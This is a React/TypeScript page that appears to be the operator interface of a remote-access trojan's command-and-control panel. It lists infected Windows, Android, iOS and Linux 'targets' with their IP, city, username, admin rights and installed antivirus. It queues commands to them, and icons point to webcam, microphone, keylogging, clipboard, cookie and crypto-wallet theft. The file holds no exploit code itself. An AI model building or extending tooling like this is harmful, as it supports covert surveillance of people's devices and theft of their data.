import { Sidebar } from "@/components/layout/sidebar";
import { GlitchText } from "@/components/ui/glitch-text";
import { Card, CardContent } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Terminal } from "@/components/ui/terminal";
import { Button } from "@/components/ui/button";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { 
  Monitor, 
  Smartphone, 
  Laptop, 
  Database, 
  Wifi,
  Apple,
  Terminal as TerminalIcon,
  Search,
  RefreshCcw,
  Loader2,
  Copy,
  Shield,
  Cpu,
  HardDrive,
  MapPin,
  User,
  Clock,
  Plus,
  Camera,
  Video,
  Keyboard,
  Mic,
  Clipboard,
  FolderOpen,
  Download,
  Upload,
  Trash2,
  Play,
  Archive,
  ListTree,
  XCircle,
  Server,
  Square,
  Info,
  Package,
  Zap,
  Power,
  Lock,
  LogOut,
  AlertTriangle,
  ShieldOff,
  ShieldCheck,
  ArrowUp,
  EyeOff,
  Key,
  History,
  Bookmark,
  FileText,
  Mail,
  Globe,
  Activity,
  Map,
  FileEdit,
  Cast,
  ArrowLeftRight,
  Network,
  MessageSquare,
  Volume2,
  ExternalLink,
  Image,
  MousePointer,
  Wallet,
  Coins,
  Send,
  MessageCircle,
  Phone,
  Gamepad2,
  Radar,
  MonitorOff,
  X
} from "lucide-react";
import { cn } from "@/lib/utils";
import { useEffect, useState } from "react";
import { ResizableHandle, ResizablePanel, ResizablePanelGroup } from "@/components/ui/resizable";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import type { Target } from "@shared/schema";
import { AVAILABLE_COMMANDS, COMMAND_CATEGORIES } from "@shared/schema";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";

const iconMap: Record<string, any> = {
  Camera, Monitor, MonitorOff, Keyboard, Video, Mic, Clipboard, ClipboardCopy: Copy,
  FolderOpen, Download, Upload, Trash2, Play, Search, Archive, Terminal: TerminalIcon,
  ListTree, XCircle, Server, Square, Info, Package, Zap, Power, RefreshCw: RefreshCcw,
  Lock, LogOut, AlertTriangle, ShieldOff, Shield, ShieldCheck, ArrowUp, EyeOff,
  Key, History, Bookmark, FileText, Mail, Globe, Activity, Map, FileEdit, Globe2: Globe,
  Skull: AlertTriangle, Cast, ArrowLeftRight, Network, MessageSquare, Volume2,
  ExternalLink, Image, MousePointer, Wallet, Coins, Cpu, Send, MessageCircle, Phone,
  Gamepad2, Radar, ZapOff: Zap, Syringe: Shield, Cookie: Bookmark, Bitcoin: Coins
};

export default function Targets() {
  const [logs, setLogs] = useState<string[]>(["System initialized...", "Waiting for connections..."]);
  const [selectedTarget, setSelectedTarget] = useState<Target | null>(null);
  const [commandDialogOpen, setCommandDialogOpen] = useState(false);
  const [commandCategory, setCommandCategory] = useState<string>("surveillance");
  const [commandParams, setCommandParams] = useState<string>("");
  const { toast } = useToast();
  const queryClient = useQueryClient();

  const { data: targets = [], isLoading: isLoadingTargets, refetch: refetchTargets } = useQuery<Target[]>({
    queryKey: ["/api/targets"],
    refetchInterval: 5000
  });

  const simulateMutation = useMutation({
    mutationFn: () => apiRequest("POST", "/api/simulate-connection"),
    onSuccess: async (data) => {
      const target = await data.json();
      addLog(`[+] NEW CONNECTION: ${target.ip} | CODE: ${target.uniqueCode}`);
      queryClient.invalidateQueries({ queryKey: ["/api/targets"] });
    }
  });

  const sendCommandMutation = useMutation({
    mutationFn: async ({ targetId, command, category, params }: { targetId: string, command: string, category: string, params?: any }) => {
      return apiRequest("POST", `/api/targets/${targetId}/commands`, {
        command,
        category,
        params,
        status: "pending"
      });
    },
    onSuccess: async () => {
      toast({ title: "Command Sent", description: "Command queued for execution" });
      queryClient.invalidateQueries({ queryKey: ["/api/targets"] });
    }
  });

  const addLog = (msg: string) => {
    setLogs(prev => [...prev, msg].slice(-100));
  };

  useEffect(() => {
    const handleLog = (e: CustomEvent) => {
      addLog(e.detail.message);
    };
    window.addEventListener('hack-log', handleLog as any);
    return () => window.removeEventListener('hack-log', handleLog as any);
  }, []);

  const windowsTargets = targets.filter(t => t.platform === 'windows');
  const androidTargets = targets.filter(t => t.platform === 'android');
  const iosTargets = targets.filter(t => t.platform === 'ios');
  const linuxTargets = targets.filter(t => t.platform === 'linux');

  const handleTargetClick = (target: Target) => {
    setSelectedTarget(target);
    setCommandDialogOpen(true);
    addLog(`[TARGET] Selected: ${target.uniqueCode} (${target.ip})`);
  };

  const handleSendCommand = (commandId: string) => {
    if (!selectedTarget) return;
    const cmd = AVAILABLE_COMMANDS.find(c => c.id === commandId);
    if (!cmd) return;
    
    sendCommandMutation.mutate({
      targetId: selectedTarget.targetId,
      command: commandId,
      category: cmd.category,
      params: commandParams ? JSON.parse(`{"value": "${commandParams}"}`) : null
    });
    addLog(`[CMD] ${cmd.name} -> ${selectedTarget.uniqueCode}`);
    setCommandParams("");
  };

  const copyCode = (code: string) => {
    navigator.clipboard.writeText(code);
    toast({ title: "Copied", description: "Unique code copied to clipboard" });
  };

  return (
    <div className="flex h-screen w-full bg-background text-foreground font-mono overflow-hidden">
      <Sidebar />
      
      <main className="flex-1 flex flex-col overflow-hidden relative">
        <header className="h-16 border-b border-primary/20 flex items-center justify-between px-6 bg-black/50 backdrop-blur-sm shrink-0">
          <div className="flex items-center gap-4">
            <h1 className="text-xl font-bold tracking-tight">
              <GlitchText text="TARGET_MANAGER // DEVICES" />
            </h1>
            <Badge variant="outline" className="border-primary/30 text-primary">
              {targets.length} CONNECTED
            </Badge>
          </div>
          <div className="flex items-center gap-4">
            <Button 
              variant="outline" 
              size="sm" 
              className="bg-primary/10 border-primary/20 hover:bg-primary/20 text-primary"
              onClick={() => simulateMutation.mutate()}
              disabled={simulateMutation.isPending}
              data-testid="button-simulate"
            >
              {simulateMutation.isPending ? (
                <><Loader2 className="w-4 h-4 mr-2 animate-spin" /> CONNECTING...</>
              ) : (
                <><Plus className="w-4 h-4 mr-2" /> SIMULATE CONNECTION</>
              )}
            </Button>
            <Button 
              variant="ghost" 
              size="sm" 
              className="text-primary/60 hover:text-primary"
              onClick={() => refetchTargets()}
              data-testid="button-refresh"
            >
              <RefreshCcw className="w-4 h-4" />
            </Button>
            <div className="flex items-center gap-2 text-xs text-primary/60">
              <Wifi className="w-4 h-4 animate-pulse" />
              <span>C2: ACTIVE</span>
            </div>
          </div>
        </header>

        <ResizablePanelGroup direction="vertical" className="flex-1">
          <ResizablePanel defaultSize={70}>
            <div className="h-full overflow-hidden flex flex-col p-6">
              <Tabs defaultValue="windows" className="w-full h-full flex flex-col">
                <TabsList className="w-full justify-start border-b border-primary/20 bg-transparent p-0 h-auto mb-6 shrink-0">
                  <TabsTrigger value="windows" className="data-[state=active]:bg-primary/10 data-[state=active]:border-b-2 data-[state=active]:border-primary rounded-none px-6 py-3 gap-2" data-testid="tab-windows">
                    <Monitor className="w-4 h-4" /> WINDOWS ({windowsTargets.length})
                  </TabsTrigger>
                  <TabsTrigger value="android" className="data-[state=active]:bg-primary/10 data-[state=active]:border-b-2 data-[state=active]:border-primary rounded-none px-6 py-3 gap-2" data-testid="tab-android">
                    <Smartphone className="w-4 h-4" /> ANDROID ({androidTargets.length})
                  </TabsTrigger>
                  <TabsTrigger value="ios" className="data-[state=active]:bg-primary/10 data-[state=active]:border-b-2 data-[state=active]:border-primary rounded-none px-6 py-3 gap-2" data-testid="tab-ios">
                    <Apple className="w-4 h-4" /> IOS ({iosTargets.length})
                  </TabsTrigger>
                  <TabsTrigger value="linux" className="data-[state=active]:bg-primary/10 data-[state=active]:border-b-2 data-[state=active]:border-primary rounded-none px-6 py-3 gap-2" data-testid="tab-linux">
                    <Database className="w-4 h-4" /> LINUX ({linuxTargets.length})
                  </TabsTrigger>
                </TabsList>

                {isLoadingTargets ? (
                  <div className="flex items-center justify-center h-full">
                    <Loader2 className="w-8 h-8 animate-spin text-primary" />
                  </div>
                ) : (
                  <>
                    <TabsContent value="windows" className="flex-1 overflow-y-auto mt-0">
                      {windowsTargets.length === 0 ? (
                        <EmptyState />
                      ) : (
                        <TargetGrid targets={windowsTargets} icon={Monitor} onClick={handleTargetClick} onCopyCode={copyCode} />
                      )}
                    </TabsContent>
                    <TabsContent value="android" className="flex-1 overflow-y-auto mt-0">
                      {androidTargets.length === 0 ? (
                        <EmptyState />
                      ) : (
                        <TargetGrid targets={androidTargets} icon={Smartphone} onClick={handleTargetClick} onCopyCode={copyCode} />
                      )}
                    </TabsContent>
                    <TabsContent value="ios" className="flex-1 overflow-y-auto mt-0">
                      {iosTargets.length === 0 ? (
                        <EmptyState />
                      ) : (
                        <TargetGrid targets={iosTargets} icon={Apple} onClick={handleTargetClick} onCopyCode={copyCode} />
                      )}
                    </TabsContent>
                    <TabsContent value="linux" className="flex-1 overflow-y-auto mt-0">
                      {linuxTargets.length === 0 ? (
                        <EmptyState />
                      ) : (
                        <TargetGrid targets={linuxTargets} icon={Database} onClick={handleTargetClick} onCopyCode={copyCode} />
                      )}
                    </TabsContent>
                  </>
                )}
              </Tabs>
            </div>
          </ResizablePanel>
          
          <ResizableHandle withHandle className="bg-primary/20" />
          
          <ResizablePanel defaultSize={30} minSize={10}>
            <div className="h-full p-0">
              <div className="h-8 bg-black border-b border-primary/20 flex items-center px-4 gap-2 text-xs text-primary/50 uppercase tracking-widest">
                <TerminalIcon className="w-3 h-3" /> Exy Console Output
              </div>
              <Terminal logs={logs} className="border-0 h-[calc(100%-2rem)]" />
            </div>
          </ResizablePanel>
        </ResizablePanelGroup>
      </main>

      <Dialog open={commandDialogOpen} onOpenChange={setCommandDialogOpen}>
        <DialogContent className="max-w-4xl max-h-[85vh] bg-black/95 border-primary/30 p-0 overflow-hidden">
          <DialogHeader className="p-6 pb-0 border-b border-primary/20">
            <DialogTitle className="flex items-center justify-between text-primary font-mono">
              <div className="flex items-center gap-4">
                <div className="p-2 bg-primary/10 rounded">
                  {selectedTarget?.platform === 'windows' && <Monitor className="w-6 h-6" />}
                  {selectedTarget?.platform === 'android' && <Smartphone className="w-6 h-6" />}
                  {selectedTarget?.platform === 'ios' && <Apple className="w-6 h-6" />}
                  {selectedTarget?.platform === 'linux' && <Database className="w-6 h-6" />}
                </div>
                <div>
                  <div className="text-lg">{selectedTarget?.name}</div>
                  <div className="text-xs text-primary/60 font-normal flex items-center gap-2">
                    <span className="font-bold text-primary">{selectedTarget?.uniqueCode}</span>
                    <Button variant="ghost" size="icon" className="h-5 w-5" onClick={() => selectedTarget && copyCode(selectedTarget.uniqueCode)}>
                      <Copy className="w-3 h-3" />
                    </Button>
                  </div>
                </div>
              </div>
              <Badge variant={selectedTarget?.status === 'online' ? 'default' : 'destructive'} className={cn(
                selectedTarget?.status === 'online' ? "bg-green-500/20 text-green-500 border-green-500/50" : "bg-red-500/20 text-red-500 border-red-500/50"
              )}>
                {selectedTarget?.status?.toUpperCase()}
              </Badge>
            </DialogTitle>
          </DialogHeader>
          
          <div className="flex h-[calc(85vh-120px)]">
            <div className="w-64 border-r border-primary/20 p-4">
              <div className="space-y-1">
                {Object.entries(COMMAND_CATEGORIES).map(([key, value]) => (
                  <Button
                    key={value}
                    variant={commandCategory === value ? "secondary" : "ghost"}
                    className={cn(
                      "w-full justify-start text-xs uppercase",
                      commandCategory === value ? "bg-primary/20 text-primary" : "text-primary/60 hover:text-primary"
                    )}
                    onClick={() => setCommandCategory(value)}
                    data-testid={`category-${value}`}
                  >
                    {key}
                  </Button>
                ))}
              </div>
              
              <div className="mt-6 pt-4 border-t border-primary/20 space-y-2 text-xs text-primary/60">
                <div className="flex items-center gap-2">
                  <MapPin className="w-3 h-3" />
                  <span>{selectedTarget?.city}, {selectedTarget?.country}</span>
                </div>
                <div className="flex items-center gap-2">
                  <Globe className="w-3 h-3" />
                  <span>{selectedTarget?.externalIp}</span>
                </div>
                <div className="flex items-center gap-2">
                  <Cpu className="w-3 h-3" />
                  <span className="truncate">{selectedTarget?.cpuModel}</span>
                </div>
                <div className="flex items-center gap-2">
                  <HardDrive className="w-3 h-3" />
                  <span>{selectedTarget?.ramSize}</span>
                </div>
                <div className="flex items-center gap-2">
                  <Shield className="w-3 h-3" />
                  <span>{selectedTarget?.antivirusInstalled || 'None'}</span>
                </div>
                <div className="flex items-center gap-2">
                  <User className="w-3 h-3" />
                  <span>{selectedTarget?.username} {selectedTarget?.isAdmin ? '(Admin)' : ''}</span>
                </div>
              </div>
            </div>
            
            <div className="flex-1 p-4">
              <div className="mb-4">
                <Input
                  placeholder="Command parameters (optional)..."
                  value={commandParams}
                  onChange={(e) => setCommandParams(e.target.value)}
                  className="bg-black/50 border-primary/30 text-primary placeholder:text-primary/30"
                  data-testid="input-command-params"
                />
              </div>
              
              <ScrollArea className="h-[calc(100%-60px)]">
                <div className="grid grid-cols-2 md:grid-cols-3 gap-2">
                  {AVAILABLE_COMMANDS.filter(cmd => cmd.category === commandCategory).map((cmd) => {
                    const IconComponent = iconMap[cmd.icon] || Info;
                    return (
                      <Button
                        key={cmd.id}
                        variant="outline"
                        className="h-auto py-3 px-4 flex flex-col items-center gap-2 bg-black/30 border-primary/20 hover:bg-primary/10 hover:border-primary/50 text-primary/80 hover:text-primary"
                        onClick={() => handleSendCommand(cmd.id)}
                        disabled={sendCommandMutation.isPending}
                        data-testid={`cmd-${cmd.id}`}
                      >
                        <IconComponent className="w-5 h-5" />
                        <span className="text-[10px] uppercase text-center leading-tight">{cmd.name}</span>
                      </Button>
                    );
                  })}
                </div>
              </ScrollArea>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}

function EmptyState() {
  return (
    <div className="flex flex-col items-center justify-center h-full text-muted-foreground gap-4">
      <Search className="w-12 h-12 opacity-20" />
      <p>No connected devices. Click "Simulate Connection" to add a test target.</p>
    </div>
  );
}

interface TargetGridProps {
  targets: Target[];
  icon: any;
  onClick: (target: Target) => void;
  onCopyCode: (code: string) => void;
}

function TargetGrid({ targets, icon: Icon, onClick, onCopyCode }: TargetGridProps) {
  return (
    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4 pb-20">
      {targets.map((target) => (
        <Card 
          key={target.id} 
          className="bg-black/40 border-primary/20 hover:bg-primary/5 hover:border-primary/50 transition-all cursor-pointer group"
          onClick={() => onClick(target)}
          data-testid={`card-target-${target.uniqueCode}`}
        >
          <CardContent className="p-4 space-y-4">
            <div className="flex items-start justify-between">
              <div className="flex items-center gap-3">
                <div className={cn("p-2 rounded bg-primary/10 text-primary", target.status === 'offline' && "bg-muted text-muted-foreground")}>
                  <Icon className="w-6 h-6" />
                </div>
                <div>
                  <div className="font-bold text-sm text-primary group-hover:text-white transition-colors">{target.name}</div>
                  <div className="text-[10px] text-muted-foreground">{target.ip}</div>
                </div>
              </div>
              <Badge variant="outline" className={cn(
                "border-0 bg-opacity-20 text-[10px] uppercase",
                target.status === 'online' ? "bg-green-500 text-green-500" : "bg-red-500 text-red-500"
              )}>
                {target.status}
              </Badge>
            </div>

            <div className="bg-primary/5 rounded p-2 flex items-center justify-between border border-primary/10">
              <code className="text-[10px] text-primary font-bold tracking-wider">{target.uniqueCode}</code>
              <Button 
                variant="ghost" 
                size="icon" 
                className="h-5 w-5 text-primary/50 hover:text-primary"
                onClick={(e) => { e.stopPropagation(); onCopyCode(target.uniqueCode); }}
                data-testid={`copy-code-${target.uniqueCode}`}
              >
                <Copy className="w-3 h-3" />
              </Button>
            </div>

            <div className="grid grid-cols-2 gap-2 text-[10px] text-muted-foreground border-t border-primary/10 pt-3">
              <div className="flex items-center gap-1">
                <MapPin className="w-3 h-3 text-primary/50" />
                <span>{target.city || target.country}</span>
              </div>
              <div className="text-right truncate">{target.os}</div>
              <div className="flex items-center gap-1">
                <User className="w-3 h-3 text-primary/50" />
                <span>{target.username || 'N/A'}</span>
              </div>
              <div className="flex items-center gap-1 justify-end">
                {target.isAdmin ? (
                  <Badge variant="outline" className="text-[8px] bg-yellow-500/20 text-yellow-500 border-yellow-500/50">ADMIN</Badge>
                ) : (
                  <span className="text-primary/40">User</span>
                )}
              </div>
            </div>
          </CardContent>
        </Card>
      ))}
    </div>
  );
}
